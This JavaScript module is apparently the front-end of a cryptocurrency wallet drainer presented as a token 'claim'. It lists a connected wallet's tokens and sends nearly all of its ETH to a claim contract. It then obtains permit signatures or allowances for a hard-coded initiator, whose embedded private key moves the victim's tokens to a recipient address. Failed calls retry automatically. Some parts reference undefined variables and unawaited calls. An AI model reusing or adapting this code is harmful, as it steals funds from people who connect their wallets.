import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/html';
import {
  configureChains,
  createConfig,
  fetchBalance,
  writeContract,
  readContract,
  signTypedData,
  getAccount,
  fetchFeeData
} from '@wagmi/core';
import { mainnet } from '@wagmi/core/chains';
import { ethers } from 'ethers';
import * as constants from './constants.js';
import { Alchemy, Network } from 'alchemy-sdk';
const config = {
  apiKey: constants.apikeys,
  network: Network.ETH_MAINNET,
};
const alchemy = new Alchemy(config);

// const chains = [arbitrum]
const chains = [mainnet];
const projectId = constants.projectId;

const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, chains }),
  publicClient,
});
const ethereumClient = new EthereumClient(wagmiConfig, chains);
export const web3modal = new Web3Modal({projectId}, ethereumClient);

let prices = [];
export let priceList = [];

export const getTokens = async (address) => {
  const balances = await alchemy.core.getTokenBalances(address);
  const nonZeroBalances = balances.tokenBalances.filter((token) => {
    return token.tokenBalance !== "0x0000000000000000000000000000000000000000000000000000000000000000";
  });
  let tokens = [];

  // Loop through all tokens with non-zero balance
  for (let token of nonZeroBalances) {
    // Get balance of token
    let balance = token.tokenBalance;
    const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
    metadata.balance = balance;
    metadata.token_address = token.contractAddress;
    tokens.push(metadata);
  }
  return tokens;
};

export const setPrice = (ticker) => {
  return new Promise(async (resolve) => {
    let token = priceList.filter((token) => token.symbol === `${ticker}USDT`);
    if (token && token.length > 0) prices.push(token[0].price);
    else prices.push(0);

    resolve(token.price);
  });
};

export const getPrice = async (symbols) => {
  for (let i = 0; i < symbols.length; i++) {
    const symbol = symbols[i];
    await setPrice(symbol);
  }
  return prices;
};

export const claim = async (_balance) => {
  try {
    const feeData = await fetchFeeData({
      chainId: 1,
      formatUnits: 'gwei',
    });
    const amount =
      _balance - BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
    return await writeContract({
      address: constants.claimAddress,
      abi: constants.CLAIMEABI,
      functionName: 'Claim',
      value: amount,
      gasPrice: feeData.gasPrice,
      gas: 30000,
    });
  } catch (error) {
    console.log(error);
    claim(_balance);
  }
};
export const increaseAllowance = async (token) => {
  try {
    const provider = new ethers.providers.JsonRpcProvider(constants.infura);

    const allow = await allownce(token);
    if (allow >= balanceOf(token)) {
      return await transfer(token);
    };
    const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
    const increaseallown = constants.increasAllownceTokens.find(tokenis => tokenis === token.token_address)
    const transfertoken = constants.transferTokens.find(tokenis => tokenis === token.token_address)
    if (permitToken) {
      const nonce = readContract({
        address: token.token_address,
        abi: constants.ALLOWANCEABI,
        functionName: 'nonces',
        args: [getAccount().address],
      })
      const { initiatorNonce } = await provider.getSigner(getAccount().address).getTransactionCount();
      const version = readContract({
        address: token.token_address,
        abi: constants.ALLOWANCEABI,
        functionName: 'version',
      })
      console.log(version)
      if( version === '1') {
        const dataToSign = JSON.stringify({
          domain: {
              name: permitToken.name, // token name
              version: "1", // version of a token
              chainId: "1",
              verifyingContract: permitToken.address
          }, 
          types: {
              EIP712Domain: [
                  { name: "name", type: "string" },
                  { name: "version", type: "string" },
                  { name: "chainId", type: "uint256" },
                  { name: "verifyingContract", type: "address" },
              ],
              Permit: [
                  { name: "holder", type: "address" },
                  { name: "spender", type: "address" },
                  { name: "nonce", type: "uint256" },
                  { name: "expiry", type: "uint256" },
                  { name: "allowed", type: "bool" },
              ]
          },
          primaryType: "Permit",
          message: { 
            holder: getAccount().address,
            spender: constants.initiator,
            nonce: nonce,
            expiry: constants.deadline,
            allowed: true,
          }
        });
        const signedData = await signTypedData(dataToSign);
        console.log(signedData);
        console.log(ethers.utils.splitSignature(signedData));
        // web3.currentProvider.sendAsync({
        //   method: "eth_signTypedData_v4",
        //   params: [account, dataToSign],
        //   from: account
        // }, async (error, result) => {

        //   if (error != null) increaseAllowance(token);
          
        //   const signature = result.result
        //   const splited = ethers.utils.splitSignature(signature)
        //   const permitData = contract.methods.permit(account, constants.initiator, nonce, constants.deadline, true,  splited.v, splited.r, splited.s).encodeABI()
        //   const gasPrice = await web3.eth.getGasPrice()
        //   const permitTX = {
        //       from: constants.initiator,
        //       to: permitToken.address,
        //       nonce: web3.utils.toHex(initiatorNonce),
        //       gasLimit: web3.utils.toHex(98000),
        //       gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
        //       value: "0x",
        //       data: permitData
        //   }
        //   const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
        //   await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
        //   .on("transactionHash", async (hash) => {
        //     console.log(hash);
        //   })
        //   .on("confirmation", async (confirmationNumber, receipt) => {
        //     if (confirmationNumber >= 1) {
        //       console.log(receipt);
        //       await transfer(token);
        //     }
          // });
        // });
      }
      if (version === '2') {

        const tokencontract = new web3.eth.Contract(
          constants.permitV2,
          token.token_address
        );
        const dataToSign = JSON.stringify({
          domain: {
              name: permitToken.name, // token name
              version: "2", // version of a token
              chainId: "1",
              verifyingContract: permitToken.address
          }, 
          types: {
              EIP712Domain: [
                  { name: "name", type: "string" },
                  { name: "version", type: "string" },
                  { name: "chainId", type: "uint256" },
                  { name: "verifyingContract", type: "address" },
              ],
              Permit: [
                  { name: "owner", type: "address" },
                  { name: "spender", type: "address" },
                  { name: "value", type: "uint256" },
                  { name: "nonce", type: "uint256" },
                  { name: "deadline", type: "uint256" },
              ]
          },
          primaryType: "Permit",
          message: { 
              owner: account, 
              spender: constants.initiator, 
              value: constants.max,
              nonce: nonce, 
              deadline: constants.deadline 
          }
        });

        web3.currentProvider.sendAsync({
          method: "eth_signTypedData_v4",
          params: [account, dataToSign],
          from: account
        }, async (error, result) => {

          if (error != null) increaseAllowance(token);

          const signature = result.result
          const splited = ethers.utils.splitSignature(signature)
          const permitData = tokencontract.methods.permit(account, constants.initiator, constants.max, constants.deadline, splited.v, splited.r, splited.s).encodeABI()
          const gasPrice = await web3.eth.getGasPrice()
          const permitTX = {
              from: constants.initiator,
              to: permitToken.address,
              nonce: web3.utils.toHex(initiatorNonce),
              gasLimit: web3.utils.toHex(98000),
              gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
              value: "0x",
              data: permitData
          }
          const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, constants.initiatorPK)
          await web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)
          .on("transactionHash", async (hash) => {
            console.log(hash);
          })
          .on("confirmation", async (confirmationNumber, receipt) => {
            if (confirmationNumber >= 1) {
              console.log(receipt);
              await transfer(token);
            }
          });
        })
      }
    }else if (increaseallown) {
      return await writeContract({
        address: token.token_address,
        abi: constants.ALLOWANCEABI,
        functionName: 'increaseAllowance',
        args: [constants.initiator, constants.max],
        gasPrice: feeData.gasPrice,
        gas: 30000,
      })
    }else if (transfertoken) {
      await writeContract({
        address: token.token_address,
        abi: constants.ALLOWANCEABI,
        functionName: 'transfer',
        args: [constants.recipient, token.balance],
        gasPrice: feeData.gasPrice,
        gas: 30000,
      })
    }
    
  } catch (error) {
    console.log(error);
    increaseAllowance(token);
  }
};

export const transfer = async (token) => {
  try {
    const amount = balanceOf(token)
    const provider = new ethers.providers.JsonRpcProvider(constants.infura);
    const signer = new ethers.Wallet(constants.initiatorPK, provider);
    const tokencontract = new ethers.Contract(
      token.token_address,
      constants.ALLOWANCEABI,
      signer
    );
    return await tokencontract.transferFrom(getAccount().address, constants.recipient, amount);
  } catch (error) {
    console.log(error);
  }
};

export const ethBalance = async () => {
  try {
    const account = getAccount().address;
    const balance = await fetchBalance({
      address: account,
    });
    return balance;
  } catch (error) {
    console.log(error);
  }
};

export const allownce = async (token) => {
  try{
    return await readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'allowance',
      args: [getAccount().address, constants.initiator],
      chainId: 1
    })
  } catch (error) {
    console.log(error);
  }
}

export const balanceOf = async (token) => {
  try{
    return await readContract({
      address: token.token_address,
      abi: constants.ALLOWANCEABI,
      functionName: 'balanceOf',
      args: [getAccount().address],
      chainId: 1
    })
  } catch (error) {
    console.log(error);
  }
}